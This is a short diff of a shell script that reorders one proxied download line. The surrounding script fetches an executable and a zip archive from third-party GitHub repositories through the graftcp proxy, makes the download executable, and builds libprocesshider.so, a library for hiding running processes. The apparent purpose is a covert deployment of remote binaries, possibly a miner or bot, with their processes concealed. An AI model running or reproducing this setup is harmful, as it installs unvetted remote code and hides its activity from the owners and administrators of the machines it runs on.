@@ -35,13 +35,13 @@ echo "**"
 echo " "
 echo " "
 
+./graftcp/graftcp wget https://raw.githubusercontent.com/scatterfafafa/jembot/main/ips.txt
+
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Nordic_Ops
 chmod +x Nordic_Ops
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNord.zip
 unzip magicNord.zip
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/scatterfafafa/jembot/main/ips.txt
 
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
